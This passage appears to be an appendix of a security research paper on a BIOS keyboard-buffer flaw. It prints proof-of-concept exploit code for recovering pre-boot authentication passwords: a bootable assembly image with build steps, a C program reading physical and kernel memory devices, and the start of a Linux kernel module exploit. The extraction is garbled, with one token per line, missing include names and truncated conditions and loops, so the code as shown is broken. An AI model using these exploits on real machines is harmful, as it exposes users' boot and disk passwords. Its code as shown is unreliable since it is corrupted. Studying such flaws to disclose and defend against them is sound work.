mov
cl,
0x01
int
0x10
pop
cx
pop
si
loop
leakloop
;-----
Terminate
as
well
as
we
can...
xor
ah,ah
int
0x16
int
0x19
;EOF
Annexe
C
:
Sploit-OS.S
;
---------------------------[
Sploit-OS.S
℄-----------------------------
;
;
Simple
bootstrap
to
test
our
BIOS
shellcode
and
verify
that
;
passwords
can
be
leaked
in
plain
text
under
REAL
MODE.
;
;
//
Jonathan
Brossard
;
PI:EMAIL
;
PI:EMAIL
;
;
------------------------------------------------------------------------
;
[
Compiling
and
using
Sploit
OS
℄
;
;
The
purpose
of
this
code
is
to
create
a
bootable
usb
disk
image
;
Poc
that
will
retrieve
pre-boot
authentication
passwords
from
;
BIOS
memory
in
Real
mode
when
booted.
;
;
;
Here,
I
assume
your
usb
disk
is
located
on
/dev/sdb
;
Use
`fdisk
-l`
to
get
your
usb
device
name
and
modify
;
those
commands
to
match
your
own
device
name.
;
;
;
Compiling
:
;
;
root@blackbox:/home/jonathan/sploit-os#
nasm
-fbin
\
;
sploitos.asm
-o
sploitos.img
;
;
Verifying
the
bootable
image
is
ok:
;
;
root@blackbox:/home/jonathan/sploit-os#
file
sploitos.img
;
x86
boot
sector,
code
offset
0x3c,
OEM-ID
"SploitOS",
sectors/
;
cluster
4,
root
entries
512,
sectors
32768
(volumes
/dev/sdb
;
root@blackbox:/home/jonathan/sploit-os#
;
;
Rebooting:
;
;
root@blackbox:/home/jonathan/sploit-os#
reboot
;
;
------------------------------------------------------------------------
org
0x7c00
;to
be
loaded
at
RAM
address
0000:7C00
section
.text
_start:
jmp
short
realstart
;
jump
over
the
boot
record's
data
;
------------------------------------------------------------------------
;
Create
a
boot
record
with
appropriate
geometry
etc.
for
a
usb
boot
disk
;
------------------------------------------------------------------------
brINT13Flag
DB
90H
;
0002h
-
0EH
for
INT13
AH=42
READ
brOEM
DB
'SploitOS'
;
0003h
-
OEM
name
&
DOS
version
brBPS
DW
512
;
000Bh
-
Bytes/sector
brSPC
DB
4
;
000Dh
-
Sectors/cluster
brResCount
DW
1
;
000Eh
-
Reserved
(boot)
sectors
brFATs
DB
2
;
0010h
-
FAT
copies
brRootEntries
DW
200H
;
0011h
-
Root
directory
entries
brSectorCount
DW
32768
;
0013h
-
Sectors
in
volume,
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
/*
*
Define
default
targets
files
and
offsets
*/
#define
DEFAULT_DEVICE
"/dev/mem"
#define
BIOS_BUFFER_ADDRESS_M
0x041e
#define
DEFAULT_PROC
"/proc/kcore"
#define
BIOS_BUFFER_ADDRESS_K
0x141e
#define
DEFAULT_KERNEL_MAP
"/dev/kmem"
#define
KERNEL_BUFFER_ADDRESS
0xC000041E
#define
BUFF_LENGTH
255
/*
max
length
for
pathnames
*/
/*
*
Display
some
help
*/
int
usage(int
argc,
char
**argv)
{
fprintf(stderr,
"usage:
%s
[-h℄
[--memory-device=℄
[--pseudo-file=℄\n"
"\n"
"--help
(or
-h)
display
this
help\n"
"--memory-device
(or
-m)
memory
device
(default:
%s)\n"
"--pseudo-file
(or
-p)
/proc
pseudo
file
(default:
%s)\n"
"--kernel-device
(or
-k)
*LINUX*
*ONLY*
kernel
memory
device
(default:
%s)\n"
"\n",
argv[0℄,
DEFAULT_DEVICE,
DEFAULT_PROC,
DEFAULT_KERNEL_MAP);
exit(-2);
}
/*
*
Give
some
credits
*/
int
credits(void)
{
printf("\n
[
BIOS
keyboard
buffer
hysteresis
generic
userland
exploit
for
*nix.
℄\n"
"
//
Jonathan
Brossard
-
PI:EMAIL
-
PI:EMAIL\n\n"
"
Tested
under
several
flavours
of
GNU/Linux,
*BSD
and
Solaris.\n\n");
return
0;
}
int
main(int
argc,
char
**argv)
{
int
fd,
i=0,j,
f;
char
tab[32℄;
char
tab2[16℄;
int
c;
int
digit_optind
=
0;
int
TARGET_OFFSET;
char
TARGET_FILE[BUFF_LENGTH℄;
int
device_flag
=
0;
/*
are
we
processing
a
device
?
*/
int
proc_flag
=
0;
/*
are
we
processing
a
file
from
/proc
pseudo
filesystem
?
*/
int
kernel_flag
=
0;
/*
are
we
processing
/dev/kmem
?
*/
int
password_flag
=
0;
/*
is
there
a
password
stored
in
BIOS
memory
?
*/
credits();
if
(argc
=
0x30
)
password_flag
=
1;
}
if
(password_flag)
{
printf("--[
Password
(to
the
latest
pre
boot
authentication
software)
:
");
}
else
{
printf("--[
No
password
found\n\n");
exit(0);
}
for
(i
=
0;
i
=
0x30
)
{
printf("\n--[
Password
(to
a
previous
authentication
software)
:");
}
else
{
printf("%c",
tab2[i℄);
}
}
printf("\n\n");
/*
*
Clean
up...
*/
if
(munmap(map,
PageSize)
#include
#include
#include
#include
#include
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pre
Boot
Authentication
Password
LKM
Exploit");
MODULE_AUTHOR("Jonathan
Brossard
//
endrazine");
#define
BiosKeyboardBuffer
0x041E
/*
*
Write
password
to
/proc
entry
routine
*/
static
int
sploit_read_pass(
char
*page,
char
**start,
off_t
off,
int
count,
\
int
*eof,
void
*data
)
{
char
tab[32℄;
char
tab2[16℄;
int
i=0,
j,
password_flag
=
0;
int
len=0;
if
(off
>
0)
{
*eof
=
1;
return
0;
}
/*
buffer
starts
at
kernel
base
address
+
BiosKeyboardBuffer
*/
sprintf(tab,
"%s",